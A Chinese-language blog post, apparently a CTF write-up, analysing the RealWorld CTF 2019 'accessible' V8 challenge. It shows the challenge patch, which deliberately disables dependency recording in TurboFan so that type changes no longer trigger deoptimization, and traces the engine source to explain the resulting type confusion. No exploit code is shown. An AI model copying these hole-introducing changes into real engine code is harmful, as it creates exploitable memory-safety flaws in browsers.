@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="在Patch文件中由于删除了添加依赖(dependency)的部分代码，导致一些元素类型在发生变化时无法触发Deoptimize，造成Type Confusion。">
+<meta name="keywords" content="exploit,Browser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RealWorld CTF2019 accessible">
+<meta property="og:url" content="http://yoursite.com/2020/05/04/RealWorld-CTF2019-accessible/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="在Patch文件中由于删除了添加依赖(dependency)的部分代码，导致一些元素类型在发生变化时无法触发Deoptimize，造成Type Confusion。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/05/04/RealWorld-CTF2019-accessible/001.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/04/RealWorld-CTF2019-accessible/002.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/04/RealWorld-CTF2019-accessible/003.png">
+<meta property="og:updated_time" content="2020-05-04T14:03:42.517Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="RealWorld CTF2019 accessible">
+<meta name="twitter:description" content="在Patch文件中由于删除了添加依赖(dependency)的部分代码，导致一些元素类型在发生变化时无法触发Deoptimize，造成Type Confusion。">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/04/RealWorld-CTF2019-accessible/001.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/05/04/RealWorld-CTF2019-accessible/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>RealWorld CTF2019 accessible | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/04/RealWorld-CTF2019-accessible/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">RealWorld CTF2019 accessible
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-05-04 15:15:47 / 修改时间：22:03:42" itemprop="dateCreated datePublished" datetime="2020-05-04T15:15:47+08:00">2020-05-04</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/" itemprop="url" rel="index"><span itemprop="name">Browser</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/v8/" itemprop="url" rel="index"><span itemprop="name">v8</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在Patch文件中由于删除了添加依赖(dependency)的部分代码，导致一些元素类型在发生变化时无法触发Deoptimize，造成Type Confusion。</p>
+<a id="more"></a>
+<hr>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code>git reset --hard eefa087eca9c54bdb923b8f5e5e14265f6970b22
+gclient sync
+git apply ../challenge.patch
+./tools/dev/v8gen.py x64.release
+ninja -C ./out.gn/x64.release d8
+./tools/dev/v8gen.py x64.debug
+ninja -C ./out.gn/x64.debug d8
+</code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Patch分析"><a href="#Patch分析" class="headerlink" title="Patch分析"></a>Patch分析</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.cc</span><br><span class="line">index 0744138..1df06df 100644</span><br><span class="line"><span class="comment">--- a/src/compiler/access-info.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/access-info.cc</span></span><br><span class="line">@@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(</span><br><span class="line">       // The field type was cleared by the GC, so we don't know anything</span><br><span class="line">       // about the contents now.</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+#if 0</span></span><br><span class="line">     unrecorded_dependencies.push_back(</span><br><span class="line">         dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,</span><br><span class="line">                                                                   descriptor));</span><br><span class="line"><span class="addition">+#endif</span></span><br><span class="line">     if (descriptors_field_type-&gt;IsClass()) &#123;</span><br><span class="line">       // Remember the field map, and try to infer a useful type.</span><br><span class="line">       Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate());</span><br><span class="line">@@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(</span><br><span class="line">   &#125;</span><br><span class="line">   // TODO(turbofan): We may want to do this only depending on the use</span><br><span class="line">   // of the access info.</span><br><span class="line"><span class="addition">+#if 0</span></span><br><span class="line">   unrecorded_dependencies.push_back(</span><br><span class="line">       dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));</span><br><span class="line"><span class="addition">+#endif</span></span><br><span class="line"> </span><br><span class="line">   PropertyConstness constness;</span><br><span class="line">   if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) &#123;</span><br><span class="line">     constness = PropertyConstness::kConst;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     map_ref.SerializeOwnDescriptor(descriptor);</span><br><span class="line"><span class="deletion">-    constness = dependencies()-&gt;DependOnFieldConstness(map_ref, descriptor);</span></span><br><span class="line"><span class="addition">+    constness = PropertyConstness::kConst;</span></span><br><span class="line">   &#125;</span><br><span class="line">   Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor),</span><br><span class="line">                               isolate());</span><br></pre></td></tr></table></figure>
+<p>修改的是<font color="#D00000">src/compiler/access-info.cc</font>文件中的<font color="#D00000">AccessInfoFactory::ComputeDataFieldAccessInfo</font>函数。<br>删除了两处<font color="#D00000">unrecorded_dependencies.push_back</font>函数，<br>并且<font color="#D00000">constness</font>始终被赋值为<font color="#D00000">PropertyConstness::kConst</font>。</p>
+<p>到这里好像什么都没看出来，dependencies的细节之前也没怎么接触到。找了一下Hpasserby师傅的<a href="https://xz.aliyun.com/t/6507" target="_blank" rel="noopener">文章</a>。<br>在未知POC的情况下只能一步一步来分析。</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(</span><br><span class="line">    Handle&lt;Map&gt; receiver_map, Handle&lt;Map&gt; <span class="built_in">map</span>, MaybeHandle&lt;JSObject&gt; holder,</span><br><span class="line">    <span class="keyword">int</span> descriptor, AccessMode access_mode) <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK_NE(descriptor, DescriptorArray::kNotFound);</span><br><span class="line">  Handle&lt;DescriptorArray&gt; descriptors(<span class="built_in">map</span>-&gt;instance_descriptors(), isolate());</span><br><span class="line">  PropertyDetails <span class="keyword">const</span> details = descriptors-&gt;GetDetails(descriptor);</span><br><span class="line">  <span class="keyword">int</span> index = descriptors-&gt;GetFieldIndex(descriptor);</span><br><span class="line">  Representation details_representation = details.representation();</span><br></pre></td></tr></table></figure>
+<p>在函数的开头获取map中的instance_descriptors，通过descriptor定位具体属性。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (details_representation.IsSmi()) &#123;</span><br><span class="line">    field_type = Type::SignedSmall();</span><br><span class="line">    unrecorded_dependencies.push_back(</span><br><span class="line">        dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,</span><br><span class="line">                                                                  descriptor));</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (details_representation.IsDouble()) &#123;</span><br><span class="line">    field_type = type_cache_-&gt;kFloat64;</span><br><span class="line">    <span class="keyword">if</span> (!FLAG_unbox_double_fields) &#123;</span><br><span class="line">      unrecorded_dependencies.push_back(</span><br><span class="line">          dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(</span><br><span class="line">              map_ref, descriptor));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (details_representation.IsHeapObject()) &#123;</span><br><span class="line">    <span class="comment">// Extract the field type from the property details (make sure its</span></span><br><span class="line">    <span class="comment">// representation is TaggedPointer to reflect the heap object case).</span></span><br><span class="line">    Handle&lt;FieldType&gt; descriptors_field_type(</span><br><span class="line">        descriptors-&gt;GetFieldType(descriptor), isolate());</span><br><span class="line">    <span class="keyword">if</span> (descriptors_field_type-&gt;IsNone()) &#123;</span><br><span class="line">      <span class="comment">// Store is not safe if the field type was cleared.</span></span><br><span class="line">      <span class="keyword">if</span> (access_mode == AccessMode::kStore) &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertyAccessInfo::Invalid(zone());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// The field type was cleared by the GC, so we don't know anything</span></span><br><span class="line">      <span class="comment">// about the contents now.</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    unrecorded_dependencies.push_back(</span><br><span class="line">        dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,</span><br><span class="line">                                                                  descriptor));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (descriptors_field_type-&gt;IsClass()) &#123;</span><br><span class="line">      <span class="comment">// Remember the field map, and try to infer a useful type.</span></span><br><span class="line">      Handle&lt;Map&gt; <span class="built_in">map</span>(descriptors_field_type-&gt;AsClass(), isolate());</span><br><span class="line">      field_type = Type::For(MapRef(broker(), <span class="built_in">map</span>));</span><br><span class="line">      field_map = MaybeHandle&lt;Map&gt;(<span class="built_in">map</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    CHECK(details_representation.IsTagged());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// TODO(turbofan): We may want to do this only depending on the use</span></span><br><span class="line">  <span class="comment">// of the access info.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  unrecorded_dependencies.push_back(</span><br><span class="line">      dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p>
+<p>接着会依次检查属性的类型并将其添加到unrecorded_dependencies中。<br>但是由于Patch的修改，当属性的类型是HeapObject时，不会将其添加到unrecorded_dependencies中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PropertyConstness constness;</span><br><span class="line"><span class="keyword">if</span> (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) &#123;</span><br><span class="line">  constness = PropertyConstness::kConst;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  map_ref.SerializeOwnDescriptor(descriptor);</span><br><span class="line">  constness = PropertyConstness::kConst;</span><br><span class="line">&#125;</span><br><span class="line">Handle&lt;Map&gt; field_owner_map(<span class="built_in">map</span>-&gt;FindFieldOwner(isolate(), descriptor),</span><br><span class="line">                            isolate());</span><br><span class="line"><span class="keyword">switch</span> (constness) &#123;</span><br><span class="line">  <span class="keyword">case</span> PropertyConstness::kMutable:</span><br><span class="line">    <span class="keyword">return</span> PropertyAccessInfo::DataField(</span><br><span class="line">        zone(), receiver_map, <span class="built_in">std</span>::move(unrecorded_dependencies), field_index,</span><br><span class="line">        details_representation, field_type, field_owner_map, field_map,</span><br><span class="line">        holder);</span><br><span class="line">  <span class="keyword">case</span> PropertyConstness::kConst:</span><br><span class="line">    <span class="keyword">return</span> PropertyAccessInfo::DataConstant(</span><br><span class="line">        zone(), receiver_map, <span class="built_in">std</span>::move(unrecorded_dependencies), field_index,</span><br><span class="line">        details_representation, field_type, field_owner_map, field_map,</span><br><span class="line">        holder);</span><br><span class="line">&#125;</span><br><span class="line">UNREACHABLE();</span><br></pre></td></tr></table></figure></p>
+<p>由于Patch修改，属性类型总是kConst，所以总是return PropertyAccessInfo::DataConstant。<br>查看PropertyAccessInfo::DataConstant函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PropertyAccessInfo PropertyAccessInfo::DataConstant(</span><br><span class="line">    Zone* zone, Handle&lt;Map&gt; receiver_map,</span><br><span class="line">    ZoneVector&lt;CompilationDependency <span class="keyword">const</span>*&gt;&amp;&amp; dependencies,</span><br><span class="line">    FieldIndex field_index, Representation field_representation,</span><br><span class="line">    Type field_type, Handle&lt;Map&gt; field_owner_map, MaybeHandle&lt;Map&gt; field_map,</span><br><span class="line">    MaybeHandle&lt;JSObject&gt; holder, MaybeHandle&lt;Map&gt; transition_map) &#123;</span><br><span class="line">  <span class="keyword">return</span> PropertyAccessInfo(kDataConstant, holder, transition_map, field_index,</span><br><span class="line">                            field_representation, field_type, field_owner_map,</span><br><span class="line">                            field_map, &#123;&#123;receiver_map&#125;, zone&#125;,</span><br><span class="line">                            <span class="built_in">std</span>::move(dependencies));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><font color="#D00000">PropertyAccessInfo::DataConstant</font>又返回<font color="#D00000">PropertyAccessInfo</font>函数。<br>查看PropertyAccessInfo函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PropertyAccessInfo::PropertyAccessInfo(</span><br><span class="line">    Kind kind, MaybeHandle&lt;JSObject&gt; holder, MaybeHandle&lt;Map&gt; transition_map,</span><br><span class="line">    FieldIndex field_index, Representation field_representation,</span><br><span class="line">    Type field_type, Handle&lt;Map&gt; field_owner_map, MaybeHandle&lt;Map&gt; field_map,</span><br><span class="line">    ZoneVector&lt;Handle&lt;Map&gt;&gt;&amp;&amp; receiver_maps,</span><br><span class="line">    ZoneVector&lt;CompilationDependency <span class="keyword">const</span>*&gt;&amp;&amp; unrecorded_dependencies)</span><br><span class="line">    : kind_(kind),</span><br><span class="line">      receiver_maps_(receiver_maps),</span><br><span class="line">      unrecorded_dependencies_(<span class="built_in">std</span>::move(unrecorded_dependencies)),</span><br><span class="line">      transition_map_(transition_map),</span><br><span class="line">      holder_(holder),</span><br><span class="line">      field_index_(field_index),</span><br><span class="line">      field_representation_(field_representation),</span><br><span class="line">      field_type_(field_type),</span><br><span class="line">      field_owner_map_(field_owner_map),</span><br><span class="line">      field_map_(field_map) &#123;</span><br><span class="line">  DCHECK_IMPLIES(!transition_map.is_null(),</span><br><span class="line">  				field_owner_map.address() == transition_map.address());</span><br></pre></td></tr></table></figure></p>
+<p><font color="#D00000">unrecorded_dependencies</font>则是被初始化赋值给私有成员<font color="#D00000">unrecorded_dependencies_</font>。<br>找一下引用该私有成员的函数，<font color="#D00000">PropertyAccessInfo::Merge</font>和<font color="#D00000">PropertyAccessInfo::RecordDependencies</font>。<br>其中Merge函数合并两个unrecorded_dependencies_。<br>RecordDependencies函数实现如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> PropertyAccessInfo::RecordDependencies(</span><br><span class="line">    CompilationDependencies* dependencies) &#123;</span><br><span class="line">  <span class="keyword">for</span> (CompilationDependency <span class="keyword">const</span>* d : unrecorded_dependencies_) &#123;</span><br><span class="line">    dependencies-&gt;RecordDependency(d);</span><br><span class="line">  &#125;</span><br><span class="line">  unrecorded_dependencies_.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中又调用了RecordDependency。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CompilationDependencies::RecordDependency(</span><br><span class="line">    CompilationDependency <span class="keyword">const</span>* dependency) &#123;</span><br><span class="line">  <span class="keyword">if</span> (dependency != <span class="literal">nullptr</span>) dependencies_.push_front(dependency);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>所以<font color="#D00000">RecordDependencies</font>把<font color="#D00000">unrecorded_dependencies_</font>转移到了<font color="#D00000">CompilationDependencies</font>类的私有成员<font color="#D00000">dependencies_</font>并且清空。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> CompilationDependencies::AreValid() <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> dep : dependencies_) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!dep-&gt;IsValid()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>查找<font color="#D00000">dependencies_</font>，引用代码基本是遍历<font color="#D00000">dependencies_</font>并调用<font color="#D00000">IsValid</font>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Reduction TypedOptimization::ReduceCheckMaps(Node* node) &#123;</span><br><span class="line">  <span class="comment">// The CheckMaps(o, ...map...) can be eliminated if map is stable,</span></span><br><span class="line">  <span class="comment">// o has type Constant(object) and map == object-&gt;map, and either</span></span><br><span class="line">  <span class="comment">//  (1) map cannot transition further, or</span></span><br><span class="line">  <span class="comment">//  (2) we can add a code dependency on the stability of map</span></span><br><span class="line">  <span class="comment">//      (to guard the Constant type information).</span></span><br><span class="line">  Node* <span class="keyword">const</span> object = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">  Type <span class="keyword">const</span> object_type = NodeProperties::GetType(object);</span><br><span class="line">  Node* <span class="keyword">const</span> effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  base::Optional&lt;MapRef&gt; object_map =</span><br><span class="line">      GetStableMapFromObjectType(broker(), object_type);</span><br><span class="line">  <span class="keyword">if</span> (object_map.has_value()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; node-&gt;op()-&gt;ValueInputCount(); ++i) &#123;</span><br><span class="line">      Node* <span class="keyword">const</span> <span class="built_in">map</span> = NodeProperties::GetValueInput(node, i);</span><br><span class="line">      Type <span class="keyword">const</span> map_type = NodeProperties::GetType(<span class="built_in">map</span>);</span><br><span class="line">      <span class="keyword">if</span> (map_type.IsHeapConstant() &amp;&amp;</span><br><span class="line">          map_type.AsHeapConstant()-&gt;Ref().equals(*object_map)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (object_map-&gt;CanTransition()) &#123;</span><br><span class="line">          dependencies()-&gt;DependOnStableMap(*object_map);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Replace(effect);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>查找调用该头文件的代码，在typed-optimization.cc文件中发现以上代码。<br>通过注释大概可以知道，在Ruduce过程中，如果map是稳定的，可以通过添加dependency的方式来将CheckMaps节点删除。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对照Hpasserby师傅的文章，由于JS类型不稳定，v8采用两种方式来确保runtime优化代码的类型安全。<br>第一种是添加CheckMaps来对类型进行检查。<br>第二种是通过dependency，将元素添加到dependencies中，通过检查dependency是否改变来触发deoptimize。<br>而正是因为在Patch中删除了某些添加dependency的代码，导致在runtime时某些元素改变无法检测，导致Type Confusion。</p>
